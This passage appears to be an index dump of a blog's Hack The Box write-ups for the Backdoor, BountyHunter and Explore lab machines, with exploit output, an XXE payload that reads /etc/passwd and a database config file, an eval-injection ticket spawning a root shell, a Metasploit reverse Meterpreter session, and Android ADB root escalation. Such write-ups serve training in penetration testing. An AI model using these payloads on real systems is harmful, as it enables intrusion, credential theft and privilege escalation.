3174 \u256d\u2500[us-release-1]-[10.10.14.136]-[triki@parrot]-[~/HTB/boxes/backdoor/results/backdoor.htb/exploit] \u2570\u2500 $ cat 998-cmdline ../../../../../../../../../proc/998/cmdline../../../../../../../../../proc/998/cmdline../../../../../../../../../proc/998/cmdlinegdbserver--once0.0.0.0:1337/bin/true<script>window.close()</script>% Here I see the server being started on 0.0.0.0 which means it listens on any interface on port 1337 Loading up GDB on my localsystem I am able to connect to the remote server for debugging. \u2570\u2500 $ gdb GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git Copyright (C) 2021 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as \"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: <https://www.gnu.org/software/gdb/bugs/>. Find the GDB manual and other documentation resources online at: <http://www.gnu.org/software/gdb/documentation/>. For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\". (gdb) target remote backdoor.htb:1337 Remote debugging using backdoor.htb:1337 Reading /usr/bin/true from remote target... warning: File transfers from remote targets can be slow. Use \"set sysroot\" to access files locally instead. Reading /usr/bin/true from remote target... Reading symbols from target:/usr/bin/true... Reading /usr/bin/53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... Reading /usr/bin/.debug/53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... Reading /usr/lib/debug//usr/bin/53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... Reading /usr/lib/debug/usr/bin//53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... Reading target:/usr/lib/debug/usr/bin//53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... (No debugging symbols found in target:/usr/bin/true) Reading /lib64/ld-linux-x86-64.so.2 from remote target... Reading /lib64/ld-linux-x86-64.so.2 from remote target... Reading symbols from target:/lib64/ld-linux-x86-64.so.2... Reading /lib64/ld-2.31.so from remote target... Reading /lib64/.debug/ld-2.31.so from remote target... Reading /usr/lib/debug//lib64/ld-2.31.so from remote target... Reading /usr/lib/debug/lib64//ld-2.31.so from remote target... Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target... (No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2) 0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2 (gdb) Googling I find an exploit for gdbserver, lets see if it works. Kept getting failures, checked msf and found a module there which was successful. msf6 exploit(multi/gdb/gdb_server_exec) > run [*] Started reverse TCP handler on 10.10.14.136:4444 [*] 10.129.239.164:1337 - Performing handshake with gdbserver... [*] 10.129.239.164:1337 - Stepping program to find PC... [*] 10.129.239.164:1337 - Writing payload at 00007ffff7fd0103... [*] 10.129.239.164:1337 - Executing the payload... [*] Sending stage (3012548 bytes) to 10.129.239.164 [*] Meterpreter session 1 opened (10.10.14.136:4444 -> 10.129.239.164:41658) at 2021-11-24 14:25:39 -0500 meterpreter > id [-] Unknown command: id meterpreter > ls Listing: /home/user =================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 20666/rw-rw-rw- 0 cha 2021-11-23 22:31:04 -0500 .bash_history 100644/rw-r--r-- 3771 fil 2021-11-10 09:18:37 -0500 .bashrc 40700/rwx------ 4096 dir 2021-11-10 09:18:39 -0500 .cache 40700/rwx------ 4096 dir 2021-11-10 09:18:39 -0500 .config 40700/rwx------ 4096 dir 2021-11-10 09:18:39 -0500 .gnupg 40775/rwxrwxr-x 4096 dir 2021-11-10 09:18:39 -0500 .local 100644/rw-r--r-- 807 fil 2021-11-10 09:18:37 -0500 .profile 100640/rw-r----- 33 fil 2021-11-23 22:32:14 -0500 user.txt meterpreter > cat user.txt 83590e59ece48d08e12d08a237cb84ee User flag found.","title":"WordPress Plugins"},{"location":"HTB/2021-06-20-backdoor/#privesc","text":"I remember I have a mysql login, after poking around nothing really useful, I mean I have the admin password hash for WordPress, but I already have a shell so, ya, moving along :) After running linpeas I noticed this process running as root which calls the screen process without the full path, I'm thinking I can hijack this process running as root. root 961 0.0 0.0 2608 1668 ? Ss 03:31 0:29 _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done Linpeas shows screen having SUID set. user@Backdoor:/tmp$ screen -x root/root screen -x root/root root@Backdoor:~# ls -ltr ls -ltr total 4 -rw-r--r-- 1 root root 33 Nov 24 03:32 root.txt root@Backdoor:~# cat root.txt cat root.txt f8a2c333b247522bd9375847570e201b ROOTED","title":"Privesc"},{"location":"HTB/2021-07-05-bountyhunter/","text":"This box is Bounty Hunter , rated an easy Linux Box. Nmap 7.92 scan initiated Wed Sep 15 18:41:33 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/triki/HTB/boxes/bountyhunter/results/10.10.11.100/scans/_full_tcp_nmap.txt -oX /home/triki/HTB/boxes/bountyhunter/results/10.10.11.100/scans/xml/_full_tcp_nmap.xml 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up, received user-set (0.024s latency). Scanned at 2021-09-15 18:41:34 EDT for 241s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION **22**/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js= | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY= | 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3 **80**/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA |_http-title: Bounty Hunters | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS! Browsing the the IP of the host I see: Checking out the links on the page: http://10.10.11.100:80/portal.php http://10.10.11.100/log_submit.php My only attack vector right now is this Bounty Report System web form. After testing the form I see the following: Running dirsearch manually I found a /resources/README.txt and db.php , I'll see if I can grab this file later. Tasks: [ ] Disable 'test' account on portal and switch to hashed password. Disable nopass. [X] Write tracker submit script [ ] Connect tracker submit script to the database [X] Fix developer group permissions By capturing the submission of the form I end up finding a php file with an interesting name in the POST POST /tracker_diRbPr00f314.php HTTP/1.1 Host: 10.10.11.100 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 245 Origin: http://10.10.11.100 DNT: 1 Connection: close Referer: http://10.10.11.100/log_submit.php Sec-GPC: 1 data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5FeHBsb2l0IG5hbWU8L3RpdGxlPgoJCTxjd2U%2BQ1dFPC9jd2U%2BCgkJPGN2c3M%2BVkNTIFNDb3JlPC9jdnNzPgoJCTxyZXdhcmQ%2BMTAwMDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D tracker_diRbProof314.php has a funny name, dirb proof eh... The data portion of the HTTP request has some base64 encoded data, lets see what it is. So this string is encoded with base64 then URL encoded. Here is the decoded string, I wonder if there is a way to exploit this. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <bugreport> <title>Exploit name</title> <cwe>CWE</cwe> <cvss>VCS SCore</cvss> <reward>1000</reward> </bugreport> After some reading I came across the OWASP top 10 which has an XXE vulnerability I might be able to use here. https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE) XXE request to get /etc/passwd <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE root [<!ENTITY read SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]> <bugreport> <title>Exploit name</title> <cwe>CWE</cwe> <cvss>VCS SCore</cvss> <reward>&read;</reward> </bugreport> The web request will look like this: POST /tracker_diRbPr00f314.php HTTP/1.1 Host: 10.10.11.100 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 1097 Origin: http://10.10.11.100 DNT: 1 Connection: close Referer: http://10.10.11.100/log_submit.php Sec-GPC: 1 data=%50%44%39%34%62%57%77%67%49%48%5a%6c%63%6e%4e%70%62%32%34%39%49%6a%45%75%4d%43%49%67%5a%57%35%6a%62%32%52%70%62%6d%63%39%49%6b%6c%54%54%79%30%34%4f%44%55%35%4c%54%45%69%50%7a%34%4b%43%51%6b%38%49%55%52%50%51%31%52%5a%55%45%55%67%63%6d%39%76%64%43%42%62%50%43%46%46%54%6c%52%4a%56%46%6b%67%63%6d%56%68%5a%43%42%54%57%56%4e%55%52%55%30%67%4a%33%42%6f%63%44%6f%76%4c%32%5a%70%62%48%52%6c%63%69%39%6a%62%32%35%32%5a%58%4a%30%4c%6d%4a%68%63%32%55%32%4e%43%31%6c%62%6d%4e%76%5a%47%55%76%63%6d%56%7a%62%33%56%79%59%32%55%39%4c%32%56%30%59%79%39%77%59%58%4e%7a%64%32%51%6e%50%6c%30%2b%43%67%6b%4a%50%47%4a%31%5a%33%4a%6c%63%47%39%79%64%44%34%4b%43%51%6b%38%64%47%6c%30%62%47%55%2b%52%58%68%77%62%47%39%70%64%43%42%75%59%57%31%6c%50%43%39%30%61%58%52%73%5a%54%34%4b%43%51%6b%38%59%33%64%6c%50%6b%4e%58%52%54%77%76%59%33%64%6c%50%67%6f%4a%43%54%78%6a%64%6e%4e%7a%50%6c%5a%44%55%79%42%54%51%32%39%79%5a%54%77%76%59%33%5a%7a%63%7a%34%4b%43%51%6b%38%63%6d%56%33%59%58%4a%6b%50%69%5a%79%5a%57%46%6b%4f%7a%77%76%63%6d%56%33%59%58%4a%6b%50%67%6f%4a%43%54%77%76%59%6e%56%6e%63%6d%56%77%62%33%4a%30%50%67%3d%3d The data portion is base64 encoded then URL encoded Decoding the data I can see the passwd file root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin Ok I have a user development , now I need a password. I used a php filter to encode the data with base64, I didn't need it to grab the passwd file, but I will need it to grab the tracker_diRbPr00f314.php file I found earlier for investigation, which I will grab now. This request grabbed me the php file I was looking for. decoded: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE root [<!ENTITY read SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/db.php'>]> <bugreport> <title>Exploit name</title> <cwe>CWE</cwe> <cvss>VCS SCore</cvss> <reward>&read;</reward> </bugreport> Encoded Request POST /tracker_diRbPr00f314.php HTTP/1.1 Host: 10.10.11.100 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 1133 Origin: http://10.10.11.100 DNT: 1 Connection: close Referer: http://10.10.11.100/log_submit.php Sec-GPC: 1 data=%50%44%39%34%62%57%77%67%49%48%5a%6c%63%6e%4e%70%62%32%34%39%49%6a%45%75%4d%43%49%67%5a%57%35%6a%62%32%52%70%62%6d%63%39%49%6b%6c%54%54%79%30%34%4f%44%55%35%4c%54%45%69%50%7a%34%4b%43%51%6b%38%49%55%52%50%51%31%52%5a%55%45%55%67%63%6d%39%76%64%43%42%62%50%43%46%46%54%6c%52%4a%56%46%6b%67%63%6d%56%68%5a%43%42%54%57%56%4e%55%52%55%30%67%4a%33%42%6f%63%44%6f%76%4c%32%5a%70%62%48%52%6c%63%69%39%6a%62%32%35%32%5a%58%4a%30%4c%6d%4a%68%63%32%55%32%4e%43%31%6c%62%6d%4e%76%5a%47%55%76%63%6d%56%7a%62%33%56%79%59%32%55%39%4c%33%5a%68%63%69%39%33%64%33%63%76%61%48%52%74%62%43%39%6b%59%69%35%77%61%48%41%6e%50%6c%30%2b%43%67%6b%4a%50%47%4a%31%5a%33%4a%6c%63%47%39%79%64%44%34%4b%43%51%6b%38%64%47%6c%30%62%47%55%2b%52%58%68%77%62%47%39%70%64%43%42%75%59%57%31%6c%50%43%39%30%61%58%52%73%5a%54%34%4b%43%51%6b%38%59%33%64%6c%50%6b%4e%58%52%54%77%76%59%33%64%6c%50%67%6f%4a%43%54%78%6a%64%6e%4e%7a%50%6c%5a%44%55%79%42%54%51%32%39%79%5a%54%77%76%59%33%5a%7a%63%7a%34%4b%43%51%6b%38%63%6d%56%33%59%58%4a%6b%50%69%5a%79%5a%57%46%6b%4f%7a%77%76%63%6d%56%33%59%58%4a%6b%50%67%6f%4a%43%54%77%76%59%6e%56%6e%63%6d%56%77%62%33%4a%30%50%67%3d%3d This is what I grabbed: HTTP/1.1 200 OK Date: Tue, 28 Sep 2021 23:04:28 GMT Server: Apache/2.4.41 (Ubuntu) Vary: Accept-Encoding Content-Length: 524 Connection: close Content-Type: text/html; charset=UTF-8 If DB were ready, would have added: <table> <tr> <td>Title:</td> <td>Exploit name</td> </tr> <tr> <td>CWE:</td> <td>CWE</td> </tr> <tr> <td>Score:</td> <td>VCS SCore</td> </tr> <tr> <td>Reward:</td> <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td> </tr> </table> Decoding the base64 gives me: <?php // TODO -> Implement login system with the database. $dbserver = \"localhost\"; $dbname = \"bounty\"; $dbusername = \"admin\"; $dbpassword = \"m19RoAU0hP41A1sTsq6K\"; $testuser = \"test\"; ?> With a username and password, I can login to the host now. \u2570\u2500[\u2622] $ ssh development@10.10.11.100 development@10.10.11.100's password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 28 Sep 2021 11:15:22 PM UTC System load: 0.0 Processes: 213 Usage of /: 24.3% of 6.83GB Users logged in: 0 Memory usage: 13% IPv4 address for eth0: 10.10.11.100 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8 development@bountyhunter:~$ I now have the user flag. Privesc Running a quick sudo -l I see the following: development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Inside the development user home dir I see development@bountyhunter:~$ ls -ltr total 8 -rw-r--r-- 1 root root 471 Jun 15 16:10 contract.txt -r--r----- 1 root development 33 Sep 28 00:47 user.txt development@bountyhunter:~$ cat contract.txt Hey team, I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed. This has been our first job since the \"rm -rf\" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why. I set up the permissions for you to test this. Good luck. -- John Looking at the python code ticketValidator.py I see they are using eval which can be abused. if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\"**\", \"\")) if validationNumber > 100: return True else: return False To abuse the python eval command, I created my own ticket that looks like this: # Skytrain Inc ## Ticket to Bridgeport __Ticket Code:__ **25+50+300+__import__('os').system('/bin/bash -i')** ##Issued: 2021/06/21 #End Ticket The vulnerability is that eval evaluates whatever you give it. Here I tell it to spawn a bash shell. Final step is to run the python script and provide the path to my ticket : development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /dev/shm/734485704.md Destination: Bridgeport root@bountyhunter:/opt/skytrain_inc# id uid=0(root) gid=0(root) groups=0(root) root@bountyhunter:/opt/skytrain_inc# ROOTED","title":"2021 07 05 bountyhunter"},{"location":"HTB/2021-07-05-bountyhunter/#privesc","text":"Running a quick sudo -l I see the following: development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Inside the development user home dir I see development@bountyhunter:~$ ls -ltr total 8 -rw-r--r-- 1 root root 471 Jun 15 16:10 contract.txt -r--r----- 1 root development 33 Sep 28 00:47 user.txt development@bountyhunter:~$ cat contract.txt Hey team, I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed. This has been our first job since the \"rm -rf\" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why. I set up the permissions for you to test this. Good luck. -- John Looking at the python code ticketValidator.py I see they are using eval which can be abused. if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\"**\", \"\")) if validationNumber > 100: return True else: return False To abuse the python eval command, I created my own ticket that looks like this: # Skytrain Inc ## Ticket to Bridgeport __Ticket Code:__ **25+50+300+__import__('os').system('/bin/bash -i')** ##Issued: 2021/06/21 #End Ticket The vulnerability is that eval evaluates whatever you give it. Here I tell it to spawn a bash shell. Final step is to run the python script and provide the path to my ticket : development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /dev/shm/734485704.md Destination: Bridgeport root@bountyhunter:/opt/skytrain_inc# id uid=0(root) gid=0(root) groups=0(root) root@bountyhunter:/opt/skytrain_inc# ROOTED","title":"Privesc"},{"location":"HTB/2021-07-20-explore/","text":"This box is Explorer , rated an easy Android OS. Starting off the NMAP . Nmap 7.92 scan initiated Wed Sep 15 15:30:47 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/triki/HTB/boxes/explore/results/10.10.10.247/scans/_full_tcp_nmap.txt -oX /home/triki/HTB/boxes/explore/results/10.10.10.247/scans/xml/_full_tcp_nmap.xml 10.10.10.247 Nmap scan report for 10.10.10.247 Host is up, received user-set (0.026s latency). Scanned at 2021-09-15 15:30:47 EDT for 462s Not shown: 65530 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 2222/tcp open ssh syn-ack ttl 63 (protocol 2.0) | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck: | SSH-2.0-SSH Server - Banana Studio | GenericLines, SSLSessionReq, SSLv23SessionReq: | SSH-2.0-SSH Server - Banana Studio | Unsupported protocol version: | GetRequest: | SSH-2.0-SSH Server - Banana Studio | Unsupported protocol version: GET / HTTP/1.0 | HTTPOptions: | SSH-2.0-SSH Server - Banana Studio | Unsupported protocol version: OPTIONS / HTTP/1.0 | Hello: | SSH-2.0-SSH Server - Banana Studio | Unsupported protocol version: EHLO | Help: | SSH-2.0-SSH Server - Banana Studio | Unsupported protocol version: HELP | RTSPRequest: | SSH-2.0-SSH Server - Banana Studio | Unsupported protocol version: OPTIONS / RTSP/1.0 | TLSSessionReq: | SSH-2.0-SSH Server - Banana Studio | Unsupported protocol version: | random1random2random3random4 | TerminalServerCookie: | SSH-2.0-SSH Server - Banana Studio | Unsupported protocol version: |_ Cookie: mstshash=nmap | ssh-hostkey: | 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL 5555/tcp filtered freeciv no-response 35189/tcp open unknown syn-ack ttl 63 | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Wed, 15 Sep 2021 19:31:25 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Wed, 15 Sep 2021 19:31:25 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Wed, 15 Sep 2021 19:31:30 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Hello: | HTTP/1.0 400 Bad Request | Date: Wed, 15 Sep 2021 19:31:45 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: EHLO | Help: | HTTP/1.0 400 Bad Request | Date: Wed, 15 Sep 2021 19:31:45 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Wed, 15 Sep 2021 19:31:30 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Wed, 15 Sep 2021 19:31:45 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???~? | ??{????w????<=?o? | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Wed, 15 Sep 2021 19:31:45 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http syn-ack ttl 63 ES File Explorer Name Response httpd |_http-title: Site doesn't have a title (text/html). 59777/tcp open http syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn't have a title (text/plain). Something that stood out to me was the SSH Server name Banana Studio and ES File Explorer , googling that comes up with an exploit. I found an older article going over a module in metasploit for this situation. This shows how to use an MSF module to exploit ES File explorer, I might be able to use parts of this later. https://www.researchgate.net/publication/349768070_Exploiting_Android_Vulnerability_in_ES_File_Explorer_CVE-2019-6447_Paper Right now I can view files on the Android system with ES File Explorer exploit, I can see files and pull files. OMG, listing the pictures on the devices produces a file called creds.png , after downloading it I have a username and password writen on a piece of paper in the picture. \u2570\u2500[\u2622] $ python ./es_file_explorer_exploit.py listPics 10.10.10.247 ================================================================== | ES File Explorer Open Port Vulnerability : CVE-2019-6447 | | Coded By : Nehal a.k.a PwnerSec | ================================================================== name : concept.jpg time : 4/21/21 02:38:08 AM location : /storage/emulated/0/DCIM/concept.jpg size : 135.33 KB (138,573 Bytes) name : anc.png time : 4/21/21 02:37:50 AM location : /storage/emulated/0/DCIM/anc.png size : 6.24 KB (6,392 Bytes) name : creds.jpg time : 4/21/21 02:38:18 AM location : /storage/emulated/0/DCIM/creds.jpg size : 1.14 MB (1,200,401 Bytes) name : 224_anc.png time : 4/21/21 02:37:21 AM location : /storage/emulated/0/DCIM/224_anc.png size : 124.88 KB (127,876 Bytes) creds.png Privesc now I can ssh into the system, and I found the flag in the root of the sdcard. \u2570\u2500[\u2622] $ ssh kristi@10.10.10.247 -p 2222 Password authentication Password: :/ $ id uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768 :/ $ from the original nmap I saw port 5555 filtered, running netstat on the host I see it running :/ $ netstat -na|grep 5555 tcp6 0 0 :::5555 :::* LISTEN :/ $ and adb normally runs as system, to access port 5555 on the device I can do an SSH port forward ssh kristi@10.10.10.247 -L 5555:localhost:5555 -p 2222 in another local shell session I run adb connect localhost:5555 adb shell \u256d\u2500[us-fort-1]-[10.10.14.15]-[triki@parrot]-[~/HTB/boxes/toolbox] \u2570\u2500 $ adb connect localhost:5555 connected to localhost:5555 \u256d\u2500[us-fort-1]-[10.10.14.15]-[triki@parrot]-[~/HTB/boxes/toolbox] \u2570\u2500 $ adb shell x86_64:/ $ id uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0 x86_64:/ $![d46e2df7d3e5e45fc28ab9903bdc7084.png](:/b68099ad3ec54c87a531deacfce28035) as the shell user I type su and become root 1|x86_64:/ $ su :/ # id uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0 :/ # then I run the find command to locate the root.txt file 1|:/ # find / -type f -name root.txt 2>/dev/null /data/root.txt 1|:/ # ROOTED","title":"2021 07 20 explore"},{"location":"HTB/2021-07-20-explore/#privesc","text":"now I can ssh into the system, and I found the flag in the root of the sdcard. \u2570\u2500[\u2622] $ ssh kristi@10.10.10.247 -p 2222 Password authentication Password: :/ $ id uid=10076(u0_a76) gid=10076(u0_a76) 